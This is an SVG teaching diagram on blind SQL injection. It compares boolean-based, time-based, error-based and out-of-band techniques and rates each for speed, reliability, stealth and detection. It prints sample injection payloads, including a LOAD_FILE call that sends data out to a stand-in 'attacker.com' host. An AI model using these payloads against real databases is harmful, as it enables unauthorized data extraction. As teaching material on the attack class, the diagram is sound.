<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" font-family="Arial, sans-serif" style="background:var(--bg)">
  <!-- palette: resources/palette_diagram.yaml -->
  <defs>
    <style id="palette-vars">
      :root, svg {
        --bg: #ffffff;
        --surface: #c4cdd6;
        --border: #6b7280;
        --text: #212121;
        --text-muted: #555555;
        --text-faint: #888888;
        --code-bg: #1a1a2e;
        --shadow: #00000044;
        --black: #000000;
        --primary-fill: #5a7a9c;
        --primary-border: #3d5a7d;
        --primary-text: #ffffff;
        --primary-accent: #243b59;
        --ok-fill: #7a9a6a;
        --ok-border: #5a7a4d;
        --ok-text: #ffffff;
        --ok-accent: #385030;
        --warn-fill: #c8924a;
        --warn-border: #9c6e2e;
        --warn-text: #ffffff;
        --warn-accent: #5a3f12;
        --danger-fill: #a86058;
        --danger-border: #7d3f38;
        --danger-text: #ffffff;
        --danger-accent: #4a1f1a;
        --info-fill: #7c6a8e;
        --info-border: #574a68;
        --info-text: #ffffff;
        --info-accent: #2f253b;
      }
    </style>
    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#7493b3"/>
      <stop offset="100%" stop-color="#3d5a7d"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#c4cdd6"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#94b384"/>
      <stop offset="100%" stop-color="#5a7a4d"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#dba868"/>
      <stop offset="100%" stop-color="#9c6e2e"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#bd7d75"/>
      <stop offset="100%" stop-color="#7d3f38"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#9384a5"/>
      <stop offset="100%" stop-color="#574a68"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="4" stdDeviation="8" flood-color="#00000044"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#3d5a7d"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#5a7a4d"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#9c6e2e"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#7d3f38"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#574a68"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>
  </defs>
  <text x="640" y="40" text-anchor="middle" font-size="28.0037" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Blind SQL Injection Techniques</text>
  <rect x="40" y="91.1765" width="581.8181" height="119.4118" rx="6" fill="url(#grad-primary)" stroke="var(--primary-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="330.9092" y="133.8235" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Boolean-Based Blind</text>
  <text x="330.9092" y="164.5294" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Different response for TRUE vs FALSE</text>
  <text x="330.9092" y="190.1176" text-anchor="middle" font-size="17.5024" fill="var(--text-muted)" font-family="Courier New, monospace">1' AND 1=1-- (true) vs 1' AND 1=2-- (false)</text>
  <rect x="658.1819" y="91.1765" width="581.8181" height="119.4118" rx="6" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="949.0909" y="133.8235" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--warn-accent)" font-family="Arial, sans-serif">Time-Based Blind</text>
  <text x="949.0909" y="164.5294" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">SLEEP/WAITFOR delays on TRUE</text>
  <text x="949.0909" y="190.1176" text-anchor="middle" font-size="17.5024" fill="var(--text-muted)" font-family="Courier New, monospace">1' AND SLEEP(5)-- (5s delay)</text>
  <rect x="40" y="244.7059" width="581.8181" height="119.4118" rx="6" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="330.9092" y="287.3529" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--danger-accent)" font-family="Arial, sans-serif">Error-Based</text>
  <text x="330.9092" y="318.0588" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Force errors that leak data</text>
  <text x="330.9092" y="343.6471" text-anchor="middle" font-size="17.5024" fill="var(--text-muted)" font-family="Courier New, monospace">EXTRACTVALUE(1, CONCAT(0x7e,...))</text>
  <rect x="658.1819" y="244.7059" width="581.8181" height="119.4118" rx="6" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="949.0909" y="287.3529" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--ok-accent)" font-family="Arial, sans-serif">Out-of-Band (OOB)</text>
  <text x="949.0909" y="318.0588" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">DNS/HTTP to attacker server</text>
  <text x="949.0909" y="343.6471" text-anchor="middle" font-size="17.5024" fill="var(--text-muted)" font-family="Courier New, monospace">LOAD_FILE('\\\\attacker.com\\...')</text>
  <rect x="94.5455" y="432.3529" width="1090.9091" height="187.6471" rx="6" fill="url(#grad-primary)" stroke="var(--primary-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="640" y="475" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Technique Comparison</text>
  <text x="240" y="517.647" text-anchor="middle" font-size="17.5024" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Speed</text>
  <text x="494.5455" y="517.647" text-anchor="middle" font-size="17.5024" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Reliability</text>
  <text x="767.2727" y="517.647" text-anchor="middle" font-size="17.5024" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Stealthiness</text>
  <text x="1021.8181" y="517.647" text-anchor="middle" font-size="17.5024" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Detection</text>
  <text x="240" y="560.2942" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Boolean: Fast</text>
  <text x="494.5455" y="560.2942" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Boolean: High</text>
  <text x="767.2727" y="560.2942" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Time: Low</text>
  <text x="1021.8181" y="560.2942" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">OOB: Hardest</text>
  <text x="240" y="594.4118" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Time: Slow</text>
  <text x="494.5455" y="594.4118" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">OOB: Medium</text>
  <text x="767.2727" y="594.4118" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Boolean: Medium</text>
  <text x="1021.8181" y="594.4118" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Error: Easiest</text>
</svg>
